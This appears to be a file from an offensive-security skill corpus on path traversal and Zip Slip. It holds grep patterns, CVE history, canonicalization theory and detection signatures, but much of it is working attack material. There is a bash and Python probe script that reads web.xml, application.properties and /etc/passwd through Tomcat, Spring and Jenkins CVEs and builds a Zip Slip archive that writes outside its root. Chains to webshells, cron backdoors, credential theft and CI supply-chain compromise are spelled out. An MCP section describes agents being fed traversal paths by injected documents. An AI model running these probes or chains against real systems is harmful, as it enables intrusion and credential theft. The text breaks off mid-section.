**Advisory-tracking note:** the WinRAR CVE is on CISA KEV with active enforcement — federal-adjacent assessments should verify the target's WinRAR version (or, more broadly, the archive-extraction library in use) as a compliance item, not just a technical one.

**Grep patterns for finding vulnerable extraction endpoints in target codebases:**

Code-review-assisted assessments should enumerate every archive-extraction call site. The specific grep patterns per language:

- **Java** — `new ZipFile(`, `new ZipInputStream(`, `Files.copy(` (for tar extraction), Apache Commons Compress `ArchiveStreamFactory.createArchiveInputStream(`, Zip4j `ZipFile(String).extractAll(`. Any call whose destination directory is derived from user input, or whose extraction pipeline doesn't call `Path.normalize().startsWith(baseDir.normalize())` on each entry, is a candidate.
- **Python** — `zipfile.ZipFile(...).extractall(`, `zipfile.ZipFile(...).extract(`, `tarfile.open(...).extractall(`. On Python 3.12+, look for explicit `filter='fully_trusted'` — this is the opt-in to the unsafe behavior. On Python ≤3.11, the default IS `fully_trusted`.
- **Node.js** — `unzipper.Extract({ path: ... })`, `yauzl.open(...)`, `adm-zip.extractAllTo(`, `tar.extract({ ... })`. Grep for these plus verify the destination path handling.
- **PHP** — `ZipArchive::extractTo(`, `PharData::extractTo(`. PHP's `ZipArchive` has had containment issues at multiple version boundaries; each site needs review.
- **Go** — `archive/zip.NewReader(`, `archive/tar.NewReader(`. Standard library provides no automatic containment; every caller must implement the check.
- **Ruby** — `Zip::File.open(...).each { |entry| entry.extract(...) }` — rubyzip; each `entry.extract` call is a candidate.
- **.NET** — `ZipFile.ExtractToDirectory(`, `ZipArchive.Entries` iteration with `ExtractToFile(`. `.NET Framework 4.5.2+` and `.NET Core 2.0+` provide safer defaults; earlier vulnerable.

**Web-upload-handler taint-flow enumeration:**

For each candidate extraction call, trace the taint flow from the HTTP upload endpoint to the extraction. The vulnerability exists when: (a) an HTTP-facing endpoint accepts an archive upload, (b) the upload lands in a filesystem location the extraction reads from, (c) the extraction writes to a destination that includes any user-influenced path component OR the extraction library doesn't validate entry names against a fixed root. Endpoint-specific auth requirements narrow the attack surface — an authenticated admin-only upload is less severe than an unauthenticated public one, but both are legitimate findings at different severity ratings.

**Historical archive-extraction CVE lineage (context for the class):**

Understanding the WinRAR CVE's position in the class requires the broader lineage:

- **2018 — Zip Slip** disclosure by Snyk documented the class formally across multiple libraries. Vulnerable at disclosure: Apache Commons Compress, HP Cypress, Java `Zip4j`, `zt-zip`, `Plexus Archiver`, `Amazon Elastic Beanstalk` extraction, `SonarQube` archive import. Many others followed.
- **CVE-2018-1002200** — `plexus-archiver` traversal.
- **CVE-2018-1002201** — `zt-zip` traversal.
- **CVE-2018-16858** — LibreOffice traversal in event macro directory.
- **CVE-2018-20250** — WinRAR ACE-format traversal (a different WinRAR CVE, historical instance of the same class).
- **CVE-2020-8129** — snyk-broker archive-related traversal.
- **CVE-2021-4104** — `node-tar` symlink-based traversal fixed in 6.1.7.
- **CVE-2022-38724** — `unzipper` traversal.
- **CVE-2023-24329** — Python `urllib.parse` traversal-adjacent (though not archive-specific, same class shape).
- **CVE-2024-23829** — `aiohttp` static-file traversal on Windows (Python 3.x, Windows-specific case-folding at issue).
- **CVE-2025-6218** — WinRAR archive traversal, the current headline.

The class-recurrence rate (roughly one to three CVEs per year across the archive-library ecosystem) illustrates why the class is evergreen. Every library ships its own extractor; each independently gets the containment right or wrong; each gets a CVE eventually.

**Zip-Slip variant that many extractors still miss — symlink then write:**

Even when an extractor properly canonicalizes each entry path against the extraction root, the symlink-then-write pattern can still escape:

1. Archive entry 1: `link` (symlink type) → `../..`. Landing path: `<extraction-root>/link`. Symlink target is outside the extraction root.
2. Archive entry 2: `link/pwn.php` (regular file). Landing path resolves through the symlink to `<extraction-root>/../../pwn.php` — outside the extraction root.

An extractor that only checks entry paths for `..` and rejects them will pass both entries above — entry 1's path is `link` (no `..`), entry 2's path is `link/pwn.php` (no `..`). Only an extractor that either (a) refuses symlink entries entirely or (b) resolves symlinks and checks the resolved path is inside the root will contain the exploit.

**Server-side archive-processing chain fingerprints:**

For a web target that processes uploaded archives, fingerprint the processing pipeline before crafting the exploit archive:

- Upload a benign archive with a distinctive filename (e.g., `test_zen_marker.zip` containing `README.md` with a distinctive string).
- After upload, request common paths where extracted content might live: `/uploads/<user-id>/README.md`, `/uploads/README.md`, `/extracted/README.md`, `/tmp/README.md`, `/attachments/README.md`. A 200 with the distinctive string reveals the extraction root.
- Alternatively, look for the archive metadata in a response — some apps display "Extracted N files" or list extracted filenames back to the user; that response is the oracle for what the extractor produced.

Once the extraction root is known, the exploit archive's escape entries can target specific paths relative to that root — the Zip-Slip primitive becomes precise rather than blind.

## Canonicalization Uniqueness — 2026 Systematization Frame

The path-traversal class shares its structural shape with a family of representation-divergence bugs across cryptographic hashing, protocol replay identity, and consensus-mechanism identity. An arXiv preprint from August 2026 systematizes the shape as a uniqueness condition on encode/decode functions and identifies the two orthogonal directions in which the condition can break.

The reference (`arXiv:2608.06508`, submitted 6 Aug 2026, cs.CR) is a single-author working-draft preprint from a private-entity origin — it is technique framing to be cited, not a peer-reviewed consensus. The abstract explicitly states the uniqueness condition and the two-direction framing at the object-side (multiple valid codes for one object) vs code-side (one code for multiple semantically distinct objects) axis. The framing is useful vocabulary for the class of canonicalization defects but should be treated as a scaffold, not as authoritative taxonomy.

**Applied to path traversal:**
- **Object-side divergence** — the object is "a file on the filesystem," and multiple URL representations produce paths that resolve to the same file. `/etc/passwd`, `/etc/./passwd`, `/etc/../etc/passwd`, `/etc/passwd/`, `/etc/passwd%00`, `\etc\passwd` (on Windows) all denote the same file to the OS but appear as distinct strings to a URL-layer check. A security check keyed on the string form treats these as different; the file-open layer treats them as identical. The check-vs-open disagreement is the bypass class — the check inspected one representation; the open resolved a different one to the same object.
- **Code-side divergence** — two paths that a URL-layer check would treat as identical (`/etc/passwd` and `/etc/passwd` after normalization) may resolve to different files at the file-open layer if the filesystem layer has case-folding (macOS HFS+, NTFS by default) or contextual resolution (symlinks, mount namespaces). The check sees "the same path" — the open sees "the file at that path in *this* filesystem context." A security decision keyed on the path string treats the two file contexts as identical; the file-open reveals they aren't.

Both directions produce a security-check-vs-effect disagreement — the check inspected one thing, the effect operated on another. The traversal-specific expressions in the current corpus (encoded slashes, Windows separators, symlink writes, mount-namespace boundaries) fall into one or the other direction. The value of the systematization frame is that it predicts where the next bug will appear: at any composition of a check and an effect that read the same input through different canonicalization layers.

The frame is not a substitute for the class-specific enumeration of bypasses — those live in the base file and in `path_traversal_lfi_rfi_advanced_deep.md`. It is a lens for spotting a not-yet-catalogued expression of the same shape. Where the frame is applied to name a specific bypass class in the corpus, the frame itself is credited to the abstract-level framing of the preprint; the more specific S-break / I-break shorthand and formal statements (as they appear in the paper's body, if resolved further) are not cited from the abstract.

**Where the frame changes assessment methodology:**

Applying the object-side vs code-side lens to a target's code review or dynamic assessment produces two orthogonal enumeration passes:

1. **Object-side pass** — enumerate every representation of a path that the target's *check layer* might normalize to a canonical form. For a URL-based read, that includes: the URL as sent, the URL after proxy decoding, the URL after backend decoding, the URL after `path.normalize`, the URL after `realpath`, the URL after the OS's own symlink resolution. Any two of these disagreeing at the security-relevant layer is an object-side divergence bug.
2. **Code-side pass** — enumerate every filesystem context the target's *effect layer* might interpret the canonical path within. That includes: the process's chroot (if any), the mount namespace, the container's rootfs, any bind-mounts, any FUSE filesystems with custom resolution, and any case-folding filesystems (NTFS, HFS+, APFS-with-case-insensitive). Any two contexts producing different files from the same canonical path is a code-side divergence bug.

Both passes are conjunctive with the standard traversal probe suite — the systematization doesn't replace the payload catalog; it directs where to look. On a well-hardened target where the standard catalog produces no findings, the two-direction lens is where residual class exposure hides.

## Cross-Reference to HTTP Request Smuggling

Parser-differential URL-path handling (this file, `path_traversal_lfi_rfi_advanced_deep.md § Cross-Decoder Decode-vs-Normalize Order`) and parser-differential HTTP-message handling (`http_request_smuggling.md`, forthcoming) share structural DNA — both live in the disagreement between two parsers on the same wire bytes. The 2024 HTTP Garden research (`arXiv:2405.17737`) documents 122 unique HTTP-parser discrepancies, 68 patched and 39 designated exploitable, and their smuggling-class expressions live in the HTTP-smuggling skill. The traversal-facing surface is only that URL-path parser-differentials can cascade through the same layer chain as HTTP-message parser-differentials, so a proxy-vs-backend disagreement can appear at both the URL layer and the header layer on the same target — a smuggling PoC against one is a fingerprint for parser-differential exposure at the other. Route smuggling-specific technique depth to `http_request_smuggling.md`.

## Emerging-Stack Traversal Expressions

Modern application-runtime shapes introduce traversal surfaces the base's "traditional web app" model doesn't cover directly. The following are stack-specific expressions that share the same class of defect but manifest in newer deployment shapes.

**Serverless function runtimes** (AWS Lambda, GCP Cloud Functions, Azure Functions):
- The read-only rootfs + writable-`/tmp` shape produces a specific chain: an upload path may write to `/tmp`, which persists across invocations of a warm sandbox. A subsequent invocation reads `/tmp` and, if the reader is a different code path than the writer, second-order traversal is available *within the same function instance* — the storage sink and the read sink are in the same runtime, connected by the `/tmp` filesystem.
- Lambda environment variables (`/proc/self/environ`) include IAM session credentials (`AWS_SESSION_TOKEN`, etc.); a read primitive that reaches `/proc/self/environ` extracts them. See `path_traversal_lfi_rfi_advanced_deep.md § Cloud-Native Path Sinks`.
- The Lambda Runtime API (`AWS_LAMBDA_RUNTIME_API` env var + `http://<endpoint>/2018-06-01/runtime/invocation/next`) is an HTTP endpoint inside the container reachable from any process — an RFI-adjacent surface that fetches from the runtime API can hijack the invocation loop.

**Edge functions** (Cloudflare Workers, Vercel Edge, Deno Deploy):
- Sandboxed by design; filesystem is typically absent or heavily restricted. Traversal in this context means abuse of the KV-store / R2 / KV-namespace paths — a "path" in KV terms is a key, and an attacker who can construct arbitrary keys can read across the namespace. Not filesystem traversal but structurally identical to it (constrained-namespace + attacker-controlled-key).

**WebAssembly runtimes** (Wasmtime, Wasmer, Wasmi):
- WASI file APIs are sandboxed to pre-opened directories (`preopen` model); traversal in this model means constructing a WASI path that escapes a preopen. The preopen-vs-path resolution has been the source of specific CVEs — a class expression rather than a specific advisory.
- Component-model-based Wasm (WASI Preview 2, released 2024) reshapes the path abstraction — the `filesystem/types.descriptor` interface exposes a capability-based file model. A traversal in this model requires escaping a directory capability rather than escaping a path string; the class still exists but manifests as capability leakage rather than string parsing.

**Kubernetes admission controllers and operators:**
- Operators frequently accept YAML manifests specifying file paths (config-map mount paths, secret paths, hostPath volumes). A malicious CustomResource can specify a hostPath that traverses from the intended mount point; the kubelet then mounts host-side files into the pod. The `hostPath` volume type is well-known to be dangerous; the class extends into any operator-specific field that ends up as a path.
- CVE-2024-9042 (Kubernetes windows-nodes command injection) and CVE-2024-10220 (`gitRepo` volume misuse; deprecated but still functional) are 2024 K8s vulnerabilities in the same broad space — path/command handling in the kubelet's volume management. Verify per-cluster before citing specific advisories.

**CI/CD pipeline evaluators:**
- GitHub Actions' `actions/checkout` and third-party path-manipulating actions have had CVEs — attacker-controlled repository paths reaching filesystem operations under the runner's identity. CVE-2025-30066 (`tj-actions/changed-files` supply-chain compromise, 2025-03) exfiltrated CI secrets via injected shell commands; the vector was action-tag hijacking, not path traversal directly, but the impact class overlaps because the compromised action had filesystem reach.
- GitLab, Bitbucket, CircleCI, Jenkins pipelines — the same shape applies wherever a pipeline configuration file (`.gitlab-ci.yml`, `bitbucket-pipelines.yml`, `Jenkinsfile`) accepts filesystem paths that the runner processes.

**Container-image builders:**
- Buildpacks (Cloud Native Buildpacks, Google Buildpacks) accept source directories; a malicious source directory with traversal-shaped filenames may reach the build environment's filesystem.
- Docker BuildKit historically had `COPY` / `ADD` traversal-adjacent behavior; a `COPY` from a URL that redirects to a `file://` URL was CVE-worthy in the past.

**MCP / agent-tool sandboxes** (2024–2026 frontier):
- Model Context Protocol servers that expose filesystem operations as tools to an LLM agent: `readFile(path)`, `writeFile(path, content)`, `listDirectory(path)`. The tool's sandboxing decides what paths the agent can reach; the class expression is agent-input-controlled traversal, which is a specific shape of prompt injection where the injected instruction is a path with `..` in it.
- The path validation is often at the MCP-server layer and often assumes the LLM won't produce traversal payloads spontaneously — but an untrusted document read by the agent may contain a traversal payload that the agent then obediently passes back as the path argument. Route to the LLM/agent-security skills; the traversal-specific detection is: does the MCP server's tool implementation call `realpath` and verify containment before every file operation?
- Public MCP filesystem servers (`@modelcontextprotocol/server-filesystem`) have had multiple traversal-adjacent issues fixed in the current active development cycle; verify the specific server implementation and version.

**HTTP/3 and QUIC path-parser expressions:**
- HTTP/3 changes the transport but not the URI-parsing layer; the URL parser in the application is unchanged.
- QUIC-specific proxies (Caddy, Envoy, Nginx HTTP/3 support) added HTTP/3 code paths that duplicate the HTTP/1.1 and HTTP/2 URL-parsing logic — any parser-differential between the three transports is a bypass class.
- Emerging: HTTP/3 gRPC frameworks translate path-based routing to gRPC service names; a path with `..` may reach a gRPC service the frontend didn't intend to expose.

## Modern Regression Patterns

Fixed vulnerabilities have a specific mode of returning: the fix addresses one instance of the class; the class survives; a later change reintroduces a functionally-equivalent bug in a different location. Path-traversal fixes exhibit this in identifiable patterns.

**The "add a check, ship a bug, refactor away the check" pattern.** The Tomcat CVE-2025-55752 shape: a security check is added in response to a disclosed bug; the fix ships; the code is refactored later for performance or readability; the refactor moves the canonicalization out from under the check; the check now guards nothing. The pattern is not unique to Tomcat — grep any code repository's history for security-relevant checks with commit messages mentioning "canonicalize" or "normalize"; the refactoring risk lives wherever a two-step (canonicalize-then-check-then-open) sequence exists.

**The "harden default, leave opt-in" pattern.** libxml 2.9 disabled external-entity resolution by default in 2013; PHP's `libxml_disable_entity_loader()` became a no-op in PHP 8.0 because the default is safe. But every code path that explicitly sets `LIBXML_NOENT | LIBXML_DTDLOAD` re-opens the exposure. Fix defaults; audit opt-ins. The path-traversal analogue: helpers like `send_from_directory` (Flask) and `send_file` with `root` option (Express) constrain when used correctly; helpers like `send_file(path)` (Rails) and `res.sendFile(path)` (Express, no root) do not. Fixed defaults in the framework don't remove class exposure where developers reach for the un-hardened helper.

**The "constrained parser, unconstrained pre-processor" pattern.** A URL parser correctly rejects traversal in a canonical URL; a pre-processor (URL rewriter, proxy filter, CDN) accepts the URL and rewrites it before the parser sees it. The parser's canonical view is fed by the rewriter's non-canonical output. Grep target codebases for URL processing that happens before URL parsing; every such pre-processor is a candidate.

**The "two parsers, one wire" pattern.** The URL is parsed at multiple layers with different rules; the disagreements are bypass classes. The advanced sibling covers the specific measured expressions of this; the pattern generalizes to any wire format read by multiple parsers — HTTP headers (smuggling), JSON (parser-confusion), YAML (yaml-load-vs-safe-load), and even TLS certificate name matching (multi-issuer confusion).

**The "sanitizer applied post-serialization" pattern (borrowed from XSS). ** A sanitizer serialized to string bytes, the bytes are re-parsed, and the parse produces a different tree than the sanitizer inspected. This is the mXSS class in XSS; the traversal analogue is a path-sanitizer that normalizes then serializes to a string, and a downstream re-parse of the string sees `../` (that the sanitizer removed but the serializer re-emitted from a codepoint variant, or that a downstream decoder introduced by re-decoding an already-decoded string).

Applying these patterns to a target codebase during a code-review-assisted assessment: enumerate every security check on a URL or path; verify the check runs on the same representation the file-open uses; verify the representation doesn't change between check and open; verify no pre-processor rewrites the input before the parser sees it. The four patterns catch the majority of new-shape traversal CVEs.

**Historical instances of each pattern:**

- **Check-then-refactor decay** — the Tomcat CVE-2025-55752 lineage is the current headline. Historical prior: multiple JSON parser bypasses over the years followed the same trajectory (a parse-then-check on a canonical form, later refactored to a check-on-raw-string for performance, silent decay of the guarantee). The specific CVE numbers vary but the shape recurs every few years across the ecosystem.
- **Hardened default, opt-in reopens** — the libxml2 → PHP → developer-opt-in chain is a decade-long instance. The traversal analogue: Django's `send_file` was hardened by default; developers who then wrote raw file-read helpers to gain streaming or range-request features reopened the class. Any framework's "safe" helper has a set of "unsafe but useful" alternatives; enumerate both.
- **Constrained parser, unconstrained pre-processor** — Cloudflare Workers' URL rewrites happen before the origin's URL parser sees the request; the rewrite is unrestricted and can inject unnormalized paths. Historical example: Apache mod_rewrite rules that construct paths from `%{HTTP:X-Custom}` header values expose whatever the header contains as an unnormalized path fragment.
- **Two parsers, one wire** — the classic Apache-in-front-of-Tomcat double-decode class from the mid-2000s; still surfacing in current CVEs. HTTP Garden research (`arXiv:2405.17737`, 2024) catalogs 122 modern parser divergences at the HTTP-message layer; the URL-path layer has fewer catalogued cases but the same underlying dynamic. Load `http_request_smuggling.md` for the current smuggling-class expressions.
- **Sanitizer applied post-serialization** — the mXSS class in XSS space is the most-documented; the traversal analogue is Windows-path canonicalization producing different results after re-normalization on different filesystems (a path sanitized on Linux and serialized to a string, re-normalized on Windows with different rules).

**Pattern-spotting checklist for a target codebase:**

1. Search for every occurrence of URL/path normalization functions: `normpath`, `realpath`, `Path.normalize`, `path.resolve`, `filepath.Clean`, `URI.normalize`.
2. For each, identify the security check that immediately precedes or follows it.
3. Trace the input string from the entry point (request handler) to the file-open call; every intermediate transformation is a candidate for check-vs-open divergence.
4. Note whether the check and open receive the same string object or different objects derived from the same input; different objects means separate normalization passes, which means divergence risk.
5. For every pre-processor (proxy, WAF, CDN, URL rewriter, middleware), verify that its input matches what the primary parser will see; every intermediate transformation is a divergence vector.

The checklist is what makes the pattern-catalog operational — patterns without applied enumeration are just labels.

**Pattern-specific prevention checklist:**

For each of the four patterns, the concrete developer-side prevention:

- **Check-then-refactor decay**: encode the canonicalization + check as a single atomic operation (a private method whose contract includes both the check and the sanitized output; callers can only obtain the sanitized value via this method, cannot bypass to the raw input). Guard against refactor by adding a test whose failure mode explicitly proves the ordering invariant: "if the check runs before decoding, this payload passes; if the check runs after, this payload fails."
- **Hardened default with opt-in reopening**: when the framework provides a safe helper and an unsafe helper, deprecate the unsafe helper with a compiler-visible marker (Python `warnings.warn(DeprecationWarning)`, Java `@Deprecated`, Rust `#[deprecated]`). Search-and-replace at scale can then find and update all callers of the unsafe helper.
- **Constrained parser with unconstrained pre-processor**: audit every pre-processing layer (proxy, rewriter, middleware) as if it were a parser. Apply the same normalization rules at every layer; make the rules explicit and version-controlled.
- **Two parsers on one wire**: enumerate every parser in the request path (WAF, proxy, framework router, application URL parser, filesystem call). For each pair of adjacent parsers, test with a payload that produces different parses (parser-differential fuzzing). Divergences are bugs.

The prevention checklist is worth publishing to development teams that own the vulnerable code — it converts a class-of-defect finding into a concrete engineering practice.

**Framework-vendor discipline patterns:**

Vendors that consistently avoid the class have identifiable practices:

- **Rust's `Path` type** — the `PathBuf` API includes `strip_prefix` and other canonicalization operations, but the type system does not enforce "canonicalized path" as a distinct type from "raw path." Code discipline is required. Some crates (`rustsec/advisory-db`) track path-traversal-adjacent advisories in the Rust ecosystem.
- **Go's `filepath.Clean` + `filepath.Rel`** — canonicalize + verify pattern; `filepath.Rel(base, canonical)` returns an error if canonical is outside base. Idiomatic Go code often uses this pattern; when it's not used, the class fires.
- **Java's `Path.startsWith` (java.nio)** — modern Java's Path API supports `path.normalize().startsWith(basePath)` — used correctly, contains the class. Legacy Java code using `java.io.File` is more error-prone.
- **Python's `pathlib.Path.resolve()` + relative-to check** — `resolve()` returns the canonical form; `try: p.relative_to(base) except ValueError: reject`. Modern idiomatic Python; less common in older code paths using `os.path`.

The tooling and idioms that make the class avoidable exist in every major language; the class fires where the tooling isn't used, not where it's missing.

## Post-Fix Detection

A vendor advisory ships and a fix is available. Target-side detection is what verifies whether a specific deployment actually applied the fix. The following approaches produce evidence:

**Version-string fingerprinting** — the coarse tool. The advisory's affected range is the definition of "vulnerable"; a version-string fingerprint answers the question at the level the advisory operates. Sources:
- HTTP response headers (`Server`, `X-Powered-By`, framework-specific `X-Runtime`, `X-AspNet-Version`).
- Default error pages (banner text, HTML footer, image URIs referring to versioned assets).
- Static asset paths (`/static/js/framework-1.2.3.min.js`) — the framework's own assets often name versions.
- Well-known endpoints — `/info`, `/actuator/info`, `/api/version`, `/build-info`, `/.well-known/version` (rare but present in some stacks).

**Behavioral fingerprinting** — the sharper tool. When the version is masked, the fix's behavioral signature may still be detectable. Example: CVE-2025-55752's fix restores the decode-then-check order; a target that rejects `GET /any-context/some%2e%2e/WEB-INF/web.xml` with 400 or 403 (fix applied) vs 200 with content (fix missing) is a behavioral discriminator. This is the class of probe that the base file's "Confirmation Discipline" section formalizes.

**Patch-signature fingerprinting** — when the target's response includes any patched-behavior artifact. Example: the patched Tomcat rejects the encoded traversal with a specific error message that includes the patched-version-only diagnostic string. Rare but sometimes present in error-verbose configurations.

**Configuration-artifact reads** — where a read primitive exists (from a related vulnerability or from the target class itself), read the target's own configuration to verify the fix. Reading `web.xml`, `application.properties`, `pom.xml`, `package.json`, or the build metadata reveals the exact deployed version.

**External asset-inventory correlation** — when a target's version is not deterministic from probes, correlate with public inventories (Shodan, Censys, BinaryEdge) or vendor telemetry (advisories citing specific customer segments) to bound the population. Not evidence for a specific target but useful for prioritization at a portfolio level.

For each of the four batch-6 CVEs above, the fingerprint hierarchy is:
- **CVE-2025-55752 (Tomcat)** — version from banner → behavioral probe (`GET /<ctx>/x%2e%2e/WEB-INF/web.xml` — 200 with content = vulnerable) → verify with a `WEB-INF/`-shape read.
- **CVE-2024-38819 (Spring)** — version from `Whitelabel Error Page` footer or `X-Application-Context` → precondition check (does `RouterFunctions.resources()` serve any static route on this app?) → behavioral probe (a `../` on the static route).
- **CVE-2024-23897 (Jenkins)** — version from `X-Jenkins` header or `/api/json?tree=version` → CLI probe (`curl 'https://jenkins/cli?remoting=false' -H 'Session:...' -d 'command=@/etc/hostname'`) → confirm the file's expected content in the response.
- **CVE-2025-6218 (WinRAR class expression)** — version from any WinRAR-derived-header artifact (rare from the web); typically fingerprint by the extractor's error messages; behavioral probe with a Zip-Slip test archive.

**Concrete probe scripts per CVE (authorization required before running):**

```bash
# CVE-2025-55752 — Tomcat Rewrite Valve traversal
# Fingerprint step
tomcat_ver=$(curl -sI "https://target/" 2>/dev/null \
  | grep -i '^Server:' | grep -oiE 'Tomcat/[0-9.]+' | cut -d/ -f2)
echo "Tomcat version: ${tomcat_ver:-unknown}"

# Behavioral probe against a candidate context (adjust /myapp/)
resp=$(curl -sw '\n%{http_code}' -o /tmp/tomcat_probe.out \
  "https://target/myapp/x%2e%2e/WEB-INF/web.xml")
code=$(echo "$resp" | tail -1)
if [ "$code" = "200" ] && grep -q '<web-app' /tmp/tomcat_probe.out; then
  echo "VULNERABLE — web.xml disclosed"
else
  echo "not disclosed (status $code)"
fi
rm /tmp/tomcat_probe.out

# CVE-2024-38819 — Spring functional-web static-resource traversal
# Fingerprint step
spring_ver=$(curl -s "https://target/nonexistent-<rand>" \
  | grep -oE 'Spring Boot[^<]+' | head -1)
echo "Spring: ${spring_ver:-unknown}"

# Precondition inference — GET a candidate static route
curl -sI "https://target/static/nonexistent.txt" | head -1
# 404 means the route exists but the file doesn't; a 5xx or missing route means not applicable

# Behavioral probe
resp=$(curl -sw '\n%{http_code}' -o /tmp/spring_probe.out \
  "https://target/static/../application.properties")
code=$(echo "$resp" | tail -1)
if [ "$code" = "200" ] && grep -qE '(spring\.|server\.|management\.)' /tmp/spring_probe.out; then
  echo "VULNERABLE — application.properties disclosed"
fi
rm /tmp/spring_probe.out

# CVE-2024-23897 — Jenkins args4j expandAtFiles
# Fingerprint step
jenkins_ver=$(curl -sI "https://target/" 2>/dev/null \
  | grep -i '^X-Jenkins:' | cut -d: -f2 | tr -d ' \r')
echo "Jenkins version: ${jenkins_ver:-unknown}"

# CLI probe — anonymous read primitive (a few lines expected without auth)
curl -s "https://target/cli?remoting=false" \
  -H 'Session: 00000000-0000-0000-0000-000000000000' \
  --data-binary $'\x00\x00\x00\x08who-am-i\x00\x00\x00\x02@/etc/passwd' | head -5

# CVE-2025-6218 — WinRAR-class server-side extraction (needs a candidate upload endpoint)
python3 <<'PY' > /tmp/zenprobe.zip.b64
import zipfile, io, base64
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('project/legit.txt', 'benign content\n')
    z.writestr('../../../../tmp/zenprobe.txt', 'ZENPROBE_ESCAPED\n')
print(base64.b64encode(buf.getvalue()).decode())
PY
base64 -d /tmp/zenprobe.zip.b64 > /tmp/zenprobe.zip

curl -X POST "https://target/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "archive=@/tmp/zenprobe.zip"

# Check whether the escape landed via a downstream oracle (adjust per target)
# ssh <shell-host> "cat /tmp/zenprobe.txt 2>/dev/null && echo VULNERABLE"
```

**Version-drift monitoring across a target inventory:**

For assessments covering a portfolio of targets, automate the version-fingerprint step. A cron-scheduled scanner should:

1. For each host in scope, probe the Tomcat/Spring/Jenkins Server or version-leaking header.
2. Match the detected version against the current CVE affected-range set for each batch-6 CVE.
3. Flag any host inside an affected range as high-priority for behavioral confirmation.
4. Store the fingerprint history so newly-published CVEs against previously-scanned versions produce retroactive alerts on the next monthly release.

The batch-6 CVEs specifically:
- Tomcat versions leak reliably from Server header on default configurations; version-masking is a compensating control.
- Spring Boot version leaks from `Whitelabel Error Page` footer, `X-Application-Context`, `/actuator/info` (when Actuator's info endpoint is public), or the shape of default error responses.
- Jenkins version leaks from `X-Jenkins` header on every response.
- WinRAR is a desktop tool — server-side detection requires either explicit inventory (managed-endpoint scans) or fingerprinting via server-side archive-processor errors that include the extractor library banner.

## CVE Chaining at the Current Frontier

The four batch-6 path-traversal CVEs have specific chaining shapes that a defender would either accept or block; at the current frontier these chains are what turns disclosure primitives into RCE and lateral-movement paths.

**Tomcat CVE-2025-55752 chain surface:**

1. CVE-2025-55752 disclosure → read `WEB-INF/classes/application.properties` → extract database credentials.
2. With DB credentials → connect to the DB from an SSRF-reachable position; if the DB is Postgres → `COPY ... TO PROGRAM` for RCE on the DB host. Route to `sql_injection.md` for the DB-side surface, `ssrf.md` for the reachability.
3. Alternative: CVE-2025-55752 + HTTP PUT enabled → JSP upload + traversal-triggered compile → RCE on the Tomcat host directly.
4. Alternative: CVE-2025-55752 read → extract JWT signing secret from Spring config → forge JWTs → route to `authentication_jwt.md`.
5. Alternative: CVE-2025-55752 read → extract cloud IAM keys from `application.properties` → route to `cloud/aws.md`, `cloud/gcp.md`, `cloud/azure.md` per detected provider.

**Spring CVE-2024-38819 chain surface:**

1. Read `application.properties` → extract secrets (as above); chain identically to the Tomcat case downstream.
2. Read `keystore.p12` or `keystore.jks` file if the app configures a mutual-TLS keystore at a filesystem path — extract client certificates that grant access to backend services.
3. Read Spring Boot's `META-INF/build-info.properties` for build metadata (git commit, build timestamp, build user) — feeds lateral-targeting.
4. Read Kubernetes secret mounts if the app runs in a pod (route to `path_traversal_lfi_rfi_advanced_deep.md § Cloud-Native Path Sinks`).

**Jenkins CVE-2024-23897 chain surface:**

1. Read `master.key` + `credentials.xml` → offline decrypt to plaintext credential store → cascade into every credential Jenkins holds (SSH private keys → lateral SSH; Docker registry creds → route to `container_registry_abuse.md`; cloud IAM keys → cloud pivot).
2. Read `users/<admin>/config.xml` → extract admin API token → full Jenkins API access as admin → create malicious jobs → RCE via job execution.
3. Read pipeline definitions (`jobs/<job>/config.xml`) → understand what infrastructure the pipeline reaches → identify next-hop targets from within the CI network.
4. Chain into supply-chain: any pipeline that publishes to a public registry (npm, PyPI, Maven Central, Docker Hub) can be re-directed to publish a malicious artifact if the pipeline's config is modifiable via the extracted admin token. Route to `supply_chain.md` for that class.

**WinRAR CVE-2025-6218 (web-upload expression) chain surface:**

1. Zip-Slip → drop webshell into web-served directory → RCE.
2. Zip-Slip → drop cron file (`/etc/cron.d/backdoor` if extractor runs as root) → deferred RCE at cron interval.
3. Zip-Slip → overwrite `/etc/nginx/conf.d/default.conf` (if extractor runs as root and Nginx is reloaded) → arbitrary web routing changes.
4. Zip-Slip → overwrite CI workflow file in a CI runner's cached workspace → CI compromise on next pipeline run.
5. Zip-Slip + symlink primitive → escape the extraction root by more than one level (the base extraction is contained to one directory; a symlink drop first then a write can reach further).

**Cross-CVE chains — where two batch-6 CVEs combine:**

- **Jenkins CVE-2024-23897 + Tomcat CVE-2025-55752**: on a target where the Jenkins server runs as a Tomcat webapp (rare but present in legacy deployments), the Jenkins CLI read primitive can extract Tomcat's own configuration (server credentials, upstream servlet paths); the Tomcat traversal reads Jenkins's data directory. Combined, both surfaces provide complementary reads.
- **Spring CVE-2024-38819 + WinRAR CVE-2025-6218**: a Spring app that provides archive-import functionality and uses WinRAR-family extraction — the traversal from CVE-2024-38819 reveals the extraction library's configuration, and the WinRAR class provides the write primitive.

## Detection Signatures for Defenders

Assessment work should note what the defender's detection surface looks like — the signatures that fire during exploitation. Where the assessment is authorized and scoped to include a purple-team component, aligning the offensive probe with the defensive signature accelerates both.

**Signatures that reliably fire on each CVE:**

- **CVE-2025-55752 (Tomcat)** — the URI `%2e%2e/WEB-INF/` matches most OWASP CRS 3.x rules; specifically CRS rule 930100 (path traversal detected). WAFs configured with CRS produce a "REQUEST_ATTACK_LFI" or similar tagged alert on the request. Tomcat's own access log records the raw URI, which includes `%2e%2e`. SIEM correlation on any Tomcat access log entry with `%2e%2e/WEB-INF/` in the URI is a high-confidence detection.
- **CVE-2024-38819 (Spring)** — a `../` in a static-resource route matches CRS 930100 as well. Additionally, Spring's own error logging on a failed resource resolution records the offending path; SIEM correlation on Spring error logs containing `NoSuchFileException` for paths outside the configured resource root is high-confidence.
- **CVE-2024-23897 (Jenkins)** — the Jenkins CLI HTTP endpoint is at `/cli`; every CLI call is logged in the Jenkins audit log. A call with an argument starting with `@` (particularly `@/etc/`, `@/var/`, `@/root/`) is anomalous — Jenkins CLI commands rarely include user-facing arguments beginning with `@` in normal use. The audit log correlation is high-confidence.
- **CVE-2025-6218 (WinRAR-class)** — for the server-side expression, the extraction library's log (if any) records extraction failures; a filesystem-level EDR/auditd rule on `openat(*, "..*", ...)` from the extraction process is a high-confidence signal. The client-side (desktop) expression is not observable server-side.

**Compensating controls that reduce exposure without a full patch:**

